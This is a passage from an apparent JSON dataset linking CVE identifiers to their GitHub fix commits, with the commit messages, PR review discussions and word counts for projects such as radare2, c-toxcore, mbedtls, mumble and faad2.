            "commit_url": "https://github.com/radareorg/radare2/commit/3ecdbf8e21186a9c5a4d3cfa3b1e9fd27045340e",
            "commit_msg": "Fix 4 byte oobread in msp430 disassembler ##crash\n\n* Only crashes with asan builds\n* Add missing =SN register\n* Reported by cnitlrt via huntrdev\n* BountyID: 1c22055b-b015-47a8-a57b-4982978751d0",
            "commit_msg_words": 28,
            "other_info": "Fix 4 byte oobread in msp430 disassembler ##crash",
            "pr_title_words": 8,
            "comments_words": 0,
            "total_other_info_words": 8
        },
        {
            "cve-id": "CVE-2022-45690",
            "commit_url": "https://github.com/stleary/JSON-java/commit/7a124d857dc8da1165c87fa788e53359a317d0f7",
            "commit_msg": "Add test cases for invalid input",
            "commit_msg_words": 6,
            "other_info": "Wrap StackOverflow with JSONException Starting 3 day comment window @stleary Do you have plans to release a new version with this commit soon? This is reported as a HIGH vulnerabilitiy by dependencies tools such as JFrog Xray. I would appreciate a release for this fix as well. Thanks a lot I should be able to get it released this weekend. Release 20220320 \u8fd9\u4e2a\u5f02\u5e38\u9700\u8981\u600e\u4e48\u89e3\u51b3\u5462\uff1f",
            "pr_title_words": 4,
            "comments_words": 59,
            "total_other_info_words": 63
        },
        {
            "cve-id": "CVE-2022-21227",
            "commit_url": "https://github.com/TryGhost/node-sqlite3/commit/593c9d498be2510d286349134537e3bf89401c4a",
            "commit_msg": "bug: fix segfault of invalid toString() object (#1450)\n\n* bug: verify toString() returns valid data\r\n* test: faulty toString test",
            "commit_msg_words": 20,
            "other_info": "bug: fix segfault of invalid toString() object",
            "pr_title_words": 7,
            "comments_words": 0,
            "total_other_info_words": 7
        },
        {
            "cve-id": "CVE-2022-35927",
            "commit_url": "https://github.com/contiki-ng/contiki-ng/commit/4fffab0e632c4d01910fa957d1fd9ef321eb87d2",
            "commit_msg": "Validate the length in the DIO prefix info option.",
            "commit_msg_words": 9,
            "other_info": "Verify DIO prefix info lengths in RPL-Classic Hello @joakimeriksson  and @nvt \r\n\r\nThank you for a critical update and release. \r\n\r\nAre these in any way related to the bugs reported by Forescout? \r\nhttps://www.kb.cert.org/vuls/id/815128 \r\n\r\nWere there any CVE's to identify the vulnerabilities so they can be tracked?\r\n\r\nThanks \r\nVijay\r\nCERT/CC Yes, some of the fixes in the release do fix some of the reported bugs. We have started to publish some of the CVEs here in our repo also. Take a look at the security section.",
            "pr_title_words": 7,
            "comments_words": 77,
            "total_other_info_words": 84
        },
        {
            "cve-id": "CVE-2022-4493",
            "commit_url": "https://github.com/scifio/scifio/commit/fcb0dbca0ec72b22fe0c9ddc8abc9cb188a0ff31",
            "commit_msg": "vuln-fix: Zip Slip Vulnerability\n\nThis fixes a Zip-Slip vulnerability.\n\nThis change does one of two things. This change either\n\n1. Inserts a guard to protect against Zip Slip.\nOR\n2. Replaces `dir.getCanonicalPath().startsWith(parent.getCanonicalPath())`, which is vulnerable to partial path traversal attacks, with the more secure `dir.getCanonicalFile().toPath().startsWith(parent.getCanonicalFile().toPath())`.\n\nFor number 2, consider `\"/usr/outnot\".startsWith(\"/usr/out\")`.\nThe check is bypassed although `/outnot` is not under the `/out` directory.\nIt's important to understand that the terminating slash may be removed when using various `String` representations of the `File` object.\nFor example, on Linux, `println(new File(\"/var\"))` will print `/var`, but `println(new File(\"/var\", \"/\")` will print `/var/`;\nhowever, `println(new File(\"/var\", \"/\").getCanonicalPath())` will print `/var`.\n\nWeakness: CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')\nSeverity: High\nCVSSS: 7.4\nDetection: CodeQL (https://codeql.github.com/codeql-query-help/java/java-zipslip/) & OpenRewrite (https://public.moderne.io/recipes/org.openrewrite.java.security.ZipSlip)\n\nReported-by: Jonathan Leitschuh <Jonathan.Leitschuh@gmail.com>\nSigned-off-by: Jonathan Leitschuh <Jonathan.Leitschuh@gmail.com>\n\nBug-tracker: https://github.com/JLLeitschuh/security-research/issues/16\n\nCo-authored-by: Moderne <team@moderne.io>",
            "commit_msg_words": 141,
            "other_info": "[SECURITY] Fix Zip Slip Vulnerability Thanks! Note: this issue was present in test code only here, but still doesn't hurt to add the guard.",
            "pr_title_words": 5,
            "comments_words": 19,
            "total_other_info_words": 24
        }
    ],
    "2018": [
        {
            "cve-id": "CVE-2018-25022",
            "commit_url": "https://github.com/TokTok/c-toxcore/commit/6b97acb773622f9abca5ef305cd55bdef1ecc484",
            "commit_msg": "Restrict packet kinds that can be sent through onion path.",
            "commit_msg_words": 10,
            "other_info": "Restrict packet kinds that can be sent through onion path. [![CLA assistant check](https://cla-assistant.io/pull/badge/signed)](https://cla-assistant.io/TokTok/c-toxcore?pullRequest=872) <br/>All committers have signed the CLA. I think it's a good idea to limit onion packets to only a restricted set.\n\n---\n\nReview status: 0 of 2 files reviewed at latest revision, all discussions resolved.\n\n---\n\n*[toxcore/onion.c, line 474 at r1](https://beta.reviewable.io/reviews/toktok/c-toxcore/872#-LA7YLrQ1Ag6kDclW_WI:-LA7YLrQ1Ag6kDclW_WJ:bn8elmg) ([raw file](https://github.com/toktok/c-toxcore/blob/6b97acb773622f9abca5ef305cd55bdef1ecc484/toxcore/onion.c#L474)):*\n> ```C\n>     }\n> \n>     if (len <= SIZE_IPPORT) {\n> ```\n\nSince there's a check for the exact length above, I don't think this is necessary.\n\n---\n\n*[toxcore/onion.c, line 478 at r1](https://beta.reviewable.io/reviews/toktok/c-toxcore/872#-LA7ZZyjB0P8bGbehzeO:-LA7ZZyjB0P8bGbehzeP:bk0x5kx) ([raw file](https://github.com/toktok/c-toxcore/blob/6b97acb773622f9abca5ef305cd55bdef1ecc484/toxcore/onion.c#L478)):*\n> ```C\n>     }\n> \n>     if (plain[SIZE_IPPORT] != NET_PACKET_ANNOUNCE_REQUEST &&\n> ```\n\nIn my opinion it would be better to write pack/unpack functions like `ipport_pack/unpack` instead of modifying the plain packet structure. \n\n---\n\n\n*Comments from [Reviewable](https://beta.reviewable.io/reviews/toktok/c-toxcore/872#-:-LA7_FlnCEwhYevRocVh:b-j1251r)*\n<!-- Sent from Reviewable.io -->\n \n\n\n\nReview status: 0 of 2 files reviewed at latest revision, 2 unresolved discussions.\n\n---\n\n*[toxcore/onion.c, line 478 at r1](https://beta.reviewable.io/reviews/toktok/c-toxcore/872#-LA7ZZyjB0P8bGbehzeO:-LA8LVR_9MPcza0ZQNOA:b-silgyn) ([raw file](https://github.com/toktok/c-toxcore/blob/6b97acb773622f9abca5ef305cd55bdef1ecc484/toxcore/onion.c#L478)):*\n<details><summary><i>Previously, sudden6 wrote\u2026</i></summary><blockquote>\n\nIn my opinion it would be better to write pack/unpack functions like `ipport_pack/unpack` instead of modifying the plain packet structure. \n</blockquote></details>\n\nRight. Let's wait for @kurnevsky to help you with this code for a month while you will be stopping him from fixing 0-day vulnerability.\n\n---\n\n\n*Comments from [Reviewable](https://beta.reviewable.io/reviews/toktok/c-toxcore/872)*\n<!-- Sent from Reviewable.io -->\n \n\n\n\nReview status: 0 of 2 files reviewed at latest revision, 2 unresolved discussions.\n\n---\n\n*[toxcore/onion.c, line 478 at r1](https://beta.reviewable.io/reviews/toktok/c-toxcore/872#-LA7ZZyjB0P8bGbehzeO:-LA8lotL1FAzQMRIBEVf:b-aldmnq) ([raw file](https://github.com/toktok/c-toxcore/blob/6b97acb773622f9abca5ef305cd55bdef1ecc484/toxcore/onion.c#L478)):*\n<details><summary><i>Previously, kpp (Roman) wrote\u2026</i></summary><blockquote>\n\nRight. Let's wait for @kurnevsky to help you with this code for a month while you will be stopping him from fixing 0-day vulnerability.\n</blockquote></details>\n\n? I think a proper fix is better than possibly introducing new problems with a bandaid fix.\n\n---\n\n\n*Comments from [Reviewable](https://beta.reviewable.io/reviews/toktok/c-toxcore/872)*\n<!-- Sent from Reviewable.io -->\n @sudden6 merge this asap and release a new version. Then work on a clean fix. Dont let a flaw in the wild just because of review.  \n\n\n\n\n\n\n\n*[toxcore/onion.c, line 474 at r1](https://beta.reviewable.io/reviews/toktok/c-toxcore/872#-LA7YLrQ1Ag6kDclW_WI:-LA8zKAM5uz7imytkLXQ:bl4dpbi) ([raw file](https://github.com/toktok/c-toxcore/blob/6b97acb773622f9abca5ef305cd55bdef1ecc484/toxcore/onion.c#L474)):*\n<details><summary><i>Previously, sudden6 wrote\u2026</i></summary><blockquote>\n\nSince there's a check for the exact length above, I don't think this is necessary.\n</blockquote></details>\n\nAbove we check only that length of decrypted data is the same as length of encrypted minus mac bytes. There is check \"length <= 1 + SEND_3\" yet above, but it checks only that packet has enough length for onion return.\n\n---\n\n\n*Comments from [Reviewable](https://beta.reviewable.io/reviews/toktok/c-toxcore/872)*\n<!-- Sent from Reviewable.io -->\n \n\n\n\n\n\n\n\n*[toxcore/onion.c, line 478 at r1](https://beta.reviewable.io/reviews/toktok/c-toxcore/872#-LA7ZZyjB0P8bGbehzeO:-LA90kKeCuDcNuSZGDz3:b-r4zq94) ([raw file](https://github.com/toktok/c-toxcore/blob/6b97acb773622f9abca5ef305cd55bdef1ecc484/toxcore/onion.c#L478)):*\n<details><summary><i>Previously, sudden6 wrote\u2026</i></summary><blockquote>\n\n? I think a proper fix is better than possibly introducing new problems with a bandaid fix.\n</blockquote></details>\n\nIt's the way the whole c-toxcore implemented - it doesn't parse packets to structs, it just works with bytes. So I suggest not to refactor it here - refactoring will bring much bigger diff.\n\n---\n\n\n*Comments from [Reviewable](https://beta.reviewable.io/reviews/toktok/c-toxcore/872)*\n<!-- Sent from Reviewable.io -->\n \n\n\n\nReview status: 0 of 2 files reviewed at latest revision, 2 unresolved discussions.\n\n---\n\n*[toxcore/onion.c, line 478 at r1](https://beta.reviewable.io/reviews/toktok/c-toxcore/872#-LA7ZZyjB0P8bGbehzeO:-LA9Gn0i6XdDQIKQtrRZ:b-ye8l9a) ([raw file](https://github.com/toktok/c-toxcore/blob/6b97acb773622f9abca5ef305cd55bdef1ecc484/toxcore/onion.c#L478)):*\n<details><summary><i>Previously, kurnevsky (Evgeny Kurnevsky) wrote\u2026</i></summary><blockquote>\n\nIt's the way the whole c-toxcore implemented - it doesn't parse packets to structs, it just works with bytes. So I suggest not to refactor it here - refactoring will bring much bigger diff.\n</blockquote></details>\n\nThis code needs lots of refactoring later. I think we can defer it for now given the relative urgency.\n\n---\n\n\n*Comments from [Reviewable](https://beta.reviewable.io/reviews/toktok/c-toxcore/872)*\n<!-- Sent from Reviewable.io -->\n \n\n\n\nReviewed 2 of 2 files at r1.\nReview status: all files reviewed at latest revision, 2 unresolved discussions.\n\n---\n\n*[toxcore/onion.c, line 474 at r1](https://beta.reviewable.io/reviews/toktok/c-toxcore/872#-LA7YLrQ1Ag6kDclW_WI:-LA9KUXgCdu6o4xVXtum:b1ke8pv) ([raw file](https://github.com/toktok/c-toxcore/blob/6b97acb773622f9abca5ef305cd55bdef1ecc484/toxcore/onion.c#L474)):*\n<details><summary><i>Previously, kurnevsky (Evgeny Kurnevsky) wrote\u2026</i></summary><blockquote>\n\nAbove we check only that length of decrypted data is the same as length of encrypted minus mac bytes. There is check \"length <= 1 + SEND_3\" yet above, but it checks only that packet has enough length for onion return.\n</blockquote></details>\n\nok, didn't see this, maybe that could be an issue in other functions too, but no need to fix that in this PR\n\n---\n\n*[toxcore/onion.c, line 478 at r1](https://beta.reviewable.io/reviews/toktok/c-toxcore/872#-LA7ZZyjB0P8bGbehzeO:-LA9L419BR07rQucaEIt:b-e4ny5t) ([raw file](https://github.com/toktok/c-toxcore/blob/6b97acb773622f9abca5ef305cd55bdef1ecc484/toxcore/onion.c#L478)):*\n<details><summary><i>Previously, iphydf wrote\u2026</i></summary><blockquote>\n\nThis code needs lots of refactoring later. I think we can defer it for now given the relative urgency.\n</blockquote></details>\n\nok for me then\n\n---\n\n\n*Comments from [Reviewable](https://beta.reviewable.io/reviews/toktok/c-toxcore/872)*\n<!-- Sent from Reviewable.io -->\n <img class=\"emoji\" title=\":lgtm_strong:\" alt=\":lgtm_strong:\" align=\"absmiddle\" src=\"https://reviewable.io/lgtm_strong.png\" height=\"20\" width=\"61\"/>\n\n---\n\nReview status: all files reviewed at latest revision, 1 unresolved discussion.\n\n---\n\n\n\n*Comments from [Reviewable](https://beta.reviewable.io/reviews/toktok/c-toxcore/872#-:-LA9gf17Bo0lgwVFD8qE:b-jbsf8z)*\n<!-- Sent from Reviewable.io -->\n @iphydf Can this be merged asap plz? Then please release the 0.2.2 in emergency. Now that the flaw is disclosed, it needs to be shiped the fastest we can. Persistent groupchats can wait 0.2.3 so that this can be fixed. And clients can update their static builds. does this mean all running nodes (including bootstrap nodes and echobot and groupbot) need to be updated aswell to fix this vulnerability?\r\nor can old nodes be tolerated in the wild? If I understood this correctly, old nodes have to be updated in order to be protected, but will still work. @zoff99 old nodes have to be updated, but it will be enough to have only one updated node in onion path (3 random nodes) to be protected. Unfortunately it's not enough to update only your node to be protected yourself. if more serious vulnerabilities may be found in the future, we should think about a mechanism to shut out vulnerable nodes. Sorry, accidently closed pr.\r\n@zoff99 right, it'd be nice to have a way to get node version for this purpose. Review is very important just as with any other code, so let's not forget about that please. In the future we should think of a way for people to disclose vulnerabilities in a more secure way that doesn't put users in danger and doesn't cause everyone to panic and think of not reviewing the code. I'm not criticizing anyone here. I know that in this situation you are all doing the best you can :). It's just something that we should try to do better in the future. It is possible to send BootstrapInfo to all public nodes. There is a u32 as integer version of toxcore lib. @iphydf how can we make sure a malicous node (custom source code) can not use this or any future vulnerability? Disclaimer: I'm not very familiar with the onion module, so my review is pretty useless. I can't confirm if there is a vulnerability, or if this patch is complete or if it's correct to limit onion routing to only two of those packet kinds. What I can say, however, is that this patch looks correct as far as C code goes and it makes sense.\n\n<img class=\"emoji\" title=\":lgtm_strong:\" alt=\":lgtm_strong:\" align=\"absmiddle\" src=\"https://reviewable.io/lgtm_strong.png\" height=\"20\" width=\"61\"/>\n\n---\n\nReviewed 2 of 2 files at r1.\nReview status: all files reviewed at latest revision, 1 unresolved discussion, some commit checks broke.\n\n---\n\n\n\n*Comments from [Reviewable](https://beta.reviewable.io/reviews/toktok/c-toxcore/872#-:-LAF7EPf9HYHRJQ6Eofb:bkojgw3)*\n<!-- Sent from Reviewable.io -->\n <img class=\"emoji\" title=\":lgtm_strong:\" alt=\":lgtm_strong:\" align=\"absmiddle\" src=\"https://reviewable.io/lgtm_strong.png\" height=\"20\" width=\"61\"/>\n\n---\n\nReviewed 2 of 2 files at r1.\nReview status: all files reviewed at latest revision, 1 unresolved discussion, some commit checks broke.\n\n---\n\n\n\n*Comments from [Reviewable](https://beta.reviewable.io/reviews/toktok/c-toxcore/872#-:-LAFMPl9549fLg2CmhU7:b-jbsf8z)*\n<!-- Sent from Reviewable.io -->\n Thank you for both reporting and fixing this! :)\r\nI'm out of time tonight, but I'll push a release with this and #867 (if done, otherwise I'll cherry-pick the commit that fixes with autotools build from it) tomorrow evening. @kurnevsky Could you explain why is it not enough to update only your node to be protected yourself? Alright, I figured it out.\r\n\r\nTo answer my own question, the issue is that the final destination of an onion reply has no idea if the packet it received comes from an onion or not.\r\n\r\nFrom the [Tox spec](https://github.com/TokTok/spec/blob/master/spec.md) (linking to the md file because the website doesn't render the diagram for some reason):\r\n\r\n```\r\npeer\r\n  -> [onion1[onion2[onion3[data]]]] -> Node A\r\n  -> [onion2[onion3[data]]][sendbackA] -> Node B\r\n  -> [onion3[data]][sendbackB[sendbackA]] -> Node C\r\n  -> [data][SendbackC[sendbackB[sendbackA]]]-> Node D (end)\r\n\r\nNode D\r\n  -> [SendbackC[sendbackB[sendbackA]]][response] -> Node C\r\n  -> [sendbackB[sendbackA]][response] -> Node B\r\n  -> [sendbackA][response] -> Node A\r\n  -> [response] -> peer\r\n```\r\n\r\nYou can see that when `Node D` sends a reply back to `peer`, `peer` has no idea whether the packet received from `Node A` was sent by `Node A` on her own behalf or on someone else's behalf through onion. @nurupo you are right, that's why I suggested to restrict packet kinds. In the future we could verify onion paths (that it has at least one updated node), but it seems there is no easy way to get version of dht node. Anyway tox network should be updated (at least partly) to add such check. We could look into introducing a non-backwards compatible change into the wire protocol such that updated peers wouldn't be able to communicate with older peers, like DHT version bump or something. That way, if you are updated, you are guaranteed to be secure. Also, this would make others users aware of the update going on.",
            "pr_title_words": 10,
            "comments_words": 1466,
            "total_other_info_words": 1476
        },
        {
            "cve-id": "CVE-2018-1318",
            "commit_url": "https://github.com/apache/trafficserver/commit/f9f017a9035a1befcc9e3afe689be54aa6c11576",
            "commit_msg": "Adds better sanity checks around the method IX",
            "commit_msg_words": 8,
            "other_info": "Adds better sanity checks around the method IX Cherry-picked to 7.1.x",
            "pr_title_words": 8,
            "comments_words": 3,
            "total_other_info_words": 11
        },
        {
            "cve-id": "CVE-2018-15861",
            "commit_url": "https://github.com/xkbcommon/libxkbcommon/commit/38e1766bc6e20108948aec8a0b222a4bad0254e9",
            "commit_msg": "xkbcomp: Don't falsely promise from ExprResolveLhs\n\nEvery user of ExprReturnLhs goes on to unconditionally dereference the\nfield return, which can be NULL if xkb_intern_atom fails. Return false\nif this is the case, so we fail safely.\n\ntestcase: splice geometry data into interp\n\nSigned-off-by: Daniel Stone <daniels@collabora.com>",
            "commit_msg_words": 46,
            "other_info": "Fix more fuzz-testing fallout Thanks! They all look good to me. I'll make another release with these soon. CVE-2018-15861.",
            "pr_title_words": 4,
            "comments_words": 15,
            "total_other_info_words": 19
        },
        {
            "cve-id": "CVE-2018-9989",
            "commit_url": "https://github.com/Mbed-TLS/mbedtls/commit/740b218386083dc708ce98ccc94a63a95cd5629e",
            "commit_msg": "Add bounds check before length read",
            "commit_msg_words": 6,
            "other_info": "IOTSSL-1878 buffer overflow in server psk hint parsing Please add a changelog entry and backport to 2.1 and 2.7. retest retest CI passed except for timing tests on FreeBSD (known issue). Ok to merge.",
            "pr_title_words": 8,
            "comments_words": 26,
            "total_other_info_words": 34
        },
        {
            "cve-id": "CVE-2018-20743",
            "commit_url": "https://github.com/mumble-voip/mumble/commit/0daec57f5cfc4225aa4527b537b4ec4fbbc35635",
            "commit_msg": "Prevent instability and crash due to message flood\n\nThis patch adds a rate limiting to selected patches. The underlying rate limiter\nused is the Leaky-Bucket algorithm. It allows for a burst of messages, but\nlimits them after a specified amount of messages within a time frame.",
            "commit_msg_words": 46,
            "other_info": "Prevent instability and crash due to message flood @davidebeatrici May I ask what priority/P0 entails? From https://wiki.mumble.info/wiki/Issue_Priorities:\r\n> MUST be fixed ASAP. Issues that prevent further development; legal issues; serious data loss issues; build issues for platforms we provide binaries for. @davidebeatrici How may I understand this? Is it my patch that \"MUST be fixed ASAP\" or does the patch fix something that \"MUST be fixed ASAP\"? The patch fixes something that \"MUST be fixed ASAP\". Qt 4 builds failing because:\r\n```c++\r\nIn file included from /usr/include/c++/4.8/chrono:35:0,\r\n                 from ./ServerUser.h:17,\r\n                 from ../ACL.cpp:14:\r\n/usr/include/c++/4.8/bits/c++0x_warning.h:32:2: error: #error This file requires compiler and library support for the ISO C++ 2011 standard. This support is currently experimental, and must be enabled with the -std=c++11 or -std=gnu++11 compiler options.\r\n #error This file requires compiler and library support for the \\\r\n  ^\r\n```\r\n\r\nMinGW builds failing because:\r\n```c++\r\nServerUser.h:106:36: error: comparison between signed and unsigned integer expressions [-Werror=sign-compare]\r\n   bool limit = this->currentTokens > (MAX_TOKENS - tokens);\r\n                                    ^\r\n``` Alright, I can work with that. The first problem should be fixable by relying on pre-C++11 means to measure time if the software is not build using at least a C++11 compiler, unless we can have this as a requirement for building.\r\n\r\nThe second problem I didn't have, but it is easily fixable. After landing we should also put this into 1.2. I think that we shouldn't create another 1.2.x release. This edit to the patch should allow for pre-C++11 builds and fixes the warning with the unsigned signed comparison.\r\n\r\nEdit: Is it normal that the CI job is pending for such a long time? It seems to be finished according to the \"Details\" link. I hope you don't mind that I squashed them, so the history looks nicer. :+1:  No problem, we usually prefer commits to be squashed if they're all related. Perfect. Now do the last changes solve the problems you mentioned early? I'm sadly not able to easily try compiling it with Qt4 or MinGW. Builds succeeded.\r\n\r\nFeel free to review my changes and squash the commits. I separated the now and millisecondsBetween methods from the LeakyBucket class, as they were neither operating directly on the object nor public. And I added static inline to each to encourage the compile to inline them.\r\n\r\nAlso I moved a comment.\r\n\r\nPlease look at it again to see if you're okay with that. Thank you very much for your contribution!",
            "pr_title_words": 8,
            "comments_words": 393,
            "total_other_info_words": 401
        },
        {
            "cve-id": "CVE-2018-11577",
            "commit_url": "https://github.com/liblouis/liblouis/commit/7e135b9313ad06218dfcf9ed63070edede7745a1",
            "commit_msg": "Fix yet another buffer overflow in the braille table parser\n\nReported by Edward-L\n\nFixes #582",
            "commit_msg_words": 15,
            "other_info": "Fix yet another buffer overflow in the braille table parser",
            "pr_title_words": 10,
            "comments_words": 0,
            "total_other_info_words": 10
        },
        {
            "cve-id": "CVE-2018-1000117",
            "commit_url": "https://github.com/python/cpython/commit/f31f9b43954e06738af0f90fd75c45f869cd678a",
            "commit_msg": "Minimal fix to prevent buffer overrun in os.symlink",
            "commit_msg_words": 8,
            "other_info": "bpo-33001: Minimal fix to prevent buffer overrun in os.symlink [GH-5990](https://github.com/python/cpython/pull/5990) is a backport of this pull request to the [3.6 branch](https://github.com/python/cpython/tree/3.6). Thanks @zooba for the PR \ud83c\udf2e\ud83c\udf89.. I'm working now to backport this PR to: 3.7.\n\ud83d\udc0d\ud83c\udf52\u26cf\ud83e\udd16  [GH-5996](https://github.com/python/cpython/pull/5996) is a backport of this pull request to the [3.7 branch](https://github.com/python/cpython/tree/3.7).",
            "pr_title_words": 9,
            "comments_words": 40,
            "total_other_info_words": 49
        },
        {
            "cve-id": "CVE-2018-20846",
            "commit_url": "https://github.com/uclouvain/openjpeg/commit/c277159986c80142180fbe5efb256bbf3bdf3edc",
            "commit_msg": "[MJ2] Avoid index out of bounds access to pi->include[]\n\nSigned-off-by: Young_X <YangX92@hotmail.com>",
            "commit_msg_words": 12,
            "other_info": "Fix multiple potential vulnerabilities and bugs Ping > @Young-X I had to revert that commit in e1740e7 since it didn't compile. I'm disappointed you submit commits that don't even compile...\r\n\r\n@rouault it seems commit https://github.com/uclouvain/openjpeg/commit/e1740e7ce79d0a1676db4da0f4189b64e85f52cb was supposed to fix CVE-2018-20846, which is about out-of-bound accesses in pi_next_lrcp, pi_next_rlcp, pi_next_rpcl, pi_next_pcrl, pi_next_rpcl, and pi_next_cprl . With that commit reverted, is there a patch for that CVE? Thanks. > is there a patch for that CVE?\r\n\r\nno @Young-X I had to revert that commit  in e1740e7ce79d0a1676db4da0f4189b64e85f52cb since it didn't compile. I'm disappointed you submit commits that don't even compile...",
            "pr_title_words": 6,
            "comments_words": 91,
            "total_other_info_words": 97
        },
        {
            "cve-id": "CVE-2018-19132",
            "commit_url": "https://github.com/squid-cache/squid/commit/4a49b6dd822597691b4d25c2bd21d0d418413246",
            "commit_msg": "fix memory leak when parsing SNMP packet",
            "commit_msg_words": 7,
            "other_info": "Fix memory leak when rejecting SNMP queries Can one of the admins verify this patch? OK to test Fast tracking this merge manually.",
            "pr_title_words": 7,
            "comments_words": 16,
            "total_other_info_words": 23
        },
        {
            "cve-id": "CVE-2018-8099",
            "commit_url": "https://github.com/libgit2/libgit2/commit/58a6fe94cb851f71214dbefac3f9bffee437d6fe",
            "commit_msg": "index: convert `read_entry` to return entry size via an out-param\n\nThe function `read_entry` does not conform to our usual coding style of\nreturning stuff via the out parameter and to use the return value for\nreporting errors. Due to most of our code conforming to that pattern, it\nhas become quite natural for us to actually return `-1` in case there is\nany error, which has also slipped in with commit 5625d86b9 (index:\nsupport index v4, 2016-05-17). As the function returns an `size_t` only,\nthough, the return value is wrapped around, causing the caller of\n`read_tree` to continue with an invalid index entry. Ultimately, this\ncan lead to a double-free.\n\nImprove code and fix the bug by converting the function to return the\nindex entry size via an out parameter and only using the return value to\nindicate errors.\n\nReported-by: Krishna Ram Prakash R <krp@gtux.in>\nReported-by: Vivek Parikh <viv0411.parikh@gmail.com>",
            "commit_msg_words": 149,
            "other_info": "Index parsing fixes",
            "pr_title_words": 3,
            "comments_words": 0,
            "total_other_info_words": 3
        },
        {
            "cve-id": "CVE-2018-17282",
            "commit_url": "https://github.com/Exiv2/exiv2/commit/670fb73dd5ee8acab90971c4878de29f9fc43a02",
            "commit_msg": "Fix #457",
            "commit_msg_words": 2,
            "other_info": "Fix #457 # [Codecov](https://codecov.io/gh/Exiv2/exiv2/pull/480?src=pr&el=h1) Report\n> Merging [#480](https://codecov.io/gh/Exiv2/exiv2/pull/480?src=pr&el=desc) into [master](https://codecov.io/gh/Exiv2/exiv2/commit/d68f42a609a4680ffa13a39e21679dca623c33e1?src=pr&el=desc) will **decrease** coverage by `<.01%`.\n> The diff coverage is `66.66%`.\n\n[![Impacted file tree graph](https://codecov.io/gh/Exiv2/exiv2/pull/480/graphs/tree.svg?width=650&token=O9G7Iswx26&height=150&src=pr)](https://codecov.io/gh/Exiv2/exiv2/pull/480?src=pr&el=tree)\n\n```diff\n@@            Coverage Diff             @@\n##           master     #480      +/-   ##\n==========================================\n- Coverage   62.89%   62.89%   -0.01%     \n==========================================\n  Files         155      155              \n  Lines       20796    20801       +5     \n==========================================\n+ Hits        13079    13082       +3     \n- Misses       7717     7719       +2\n```\n\n\n| [Impacted Files](https://codecov.io/gh/Exiv2/exiv2/pull/480?src=pr&el=tree) | Coverage \u0394 | |\n|---|---|---|\n| [src/tiffimage.cpp](https://codecov.io/gh/Exiv2/exiv2/pull/480/diff?src=pr&el=tree#diff-c3JjL3RpZmZpbWFnZS5jcHA=) | `86.6% <66.66%> (-1.25%)` | :arrow_down: |\n\n------\n\n[Continue to review full report at Codecov](https://codecov.io/gh/Exiv2/exiv2/pull/480?src=pr&el=continue).\n> **Legend** - [Click here to learn more](https://docs.codecov.io/docs/codecov-delta)\n> `\u0394 = absolute <relative> (impact)`, `\u00f8 = not affected`, `? = missing data`\n> Powered by [Codecov](https://codecov.io/gh/Exiv2/exiv2/pull/480?src=pr&el=footer). Last update [d68f42a...4b1d065](https://codecov.io/gh/Exiv2/exiv2/pull/480?src=pr&el=lastupdated). Read the [comment docs](https://docs.codecov.io/docs/pull-request-comments).",
            "pr_title_words": 2,
            "comments_words": 118,
            "total_other_info_words": 120
        },
        {
            "cve-id": "CVE-2018-13843",
            "commit_url": "https://github.com/samtools/htslib/commit/99acb64270f43a015672b4cd9e72c3b02c334c4d",
            "commit_msg": "Fix memory leak in `test_realn`.\nFix buffer overflow in `sam_parse1`.\nFixes #731.",
            "commit_msg_words": 12,
            "other_info": "Fix memory leak in `test_realn`.",
            "pr_title_words": 5,
            "comments_words": 0,
            "total_other_info_words": 5
        },
        {
            "cve-id": "CVE-2018-20360",
            "commit_url": "https://github.com/knik0/faad2/commit/6823e6610c9af1b0080cb22b9da03efb208d7d57",
            "commit_msg": "ps_dec: sanitize iid_index before mixing\n\nindex range is supposed to be withing -7 and 7 or -15 and 15 depending on\niid_mode (see Table 8.24, ISO/IEC 14496-3:2005).\n\nIndexes outside these boundaries are likely to be errors and should be\nsanitized to avoid memory corruption. Replace any index under\n-no_iid_steps (-7 or -15 depending on iid_mode) by -no_iid_steps. Replace\nany index above no_iid_steps by no_iid_steps. Try to process further.\n\nThis commit addresses CVE-2019-6956 (fixes #39).",
            "commit_msg_words": 74,
            "other_info": "specrec: better handle unexpected PS (CVE-2018-20360/CVE-2018-20199) Please, do not merge this right now, I'd like to make a second review of my code a bit later :-) Alright, I am waiting for your \"go!\". :+1:  I had a second look at \"specrec: better handle unexpected PS\", looks fine to me.\r\n\r\nI have pushed a new fix \"ps_dec: sanitize iid_index before mixing\" which addresses #39 (CVE-2019-6956). This is the best I can do with my current knowledge of the standard. It fixes the issue, and I don't expect it to break anything which was already working before.\r\n\r\nIt would be great if you could have a look at it before merging :) Thanks for that! Now there is not much left to fix, I guess. :grin:  > Thanks for that! Now there is not much left to fix, I guess.\r\n\r\nGreat ! I'm glad to hear that ! :)\r\n\r\nFabian, are you planning to prepare a Debian testing upload? I will upload a jessie update shortly and will coordinate with the security team for stretch and buster fixes. > Fabian, are you planning to prepare a Debian testing upload? I will upload a jessie update shortly and will coordinate with the security team for stretch and buster fixes.\r\n\r\nHonestly, no, I didn't have such plans. My idea was to wait until the dust has settled a bit, tag a new release in this repository and upload that to Debian unstable.\r\n > Honestly, no, I didn't have such plans. My idea was to wait until the dust has settled a bit, tag a new release in this repository and upload that to Debian unstable.\r\n\r\nWell, I don't see clear benefits in waiting, at least in the jessie/stretch/buster cases. I'd like to see some of these issues fixed in Jessie (the stack buffer overflow in particular), and if I am not mistaken the security team also wants to release a DSA (at least they have a dsa-needed entry for faad2, I will discuss it again with them).\r\n\r\nIf you need help, I can provide a NMU for unstable, featuring targeted patches, until you push a new release. > If you need help, I can provide a NMU for unstable, featuring targeted patches, until you push a new release.\r\n\r\nYes, please, that would be highly appreciated!\r\n > > If you need help, I can provide a NMU for unstable, featuring targeted patches, until you push a new release.\r\n> \r\n> Yes, please, that would be highly appreciated!\r\n\r\nGreat, I have prepared a NMU, see https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=914641 :)",
            "pr_title_words": 6,
            "comments_words": 416,
            "total_other_info_words": 422
        },
        {
            "cve-id": "CVE-2018-20750",
            "commit_url": "https://github.com/LibVNC/libvncserver/commit/09e8fc02f59f16e2583b34fe1a270c238bd9ffec",
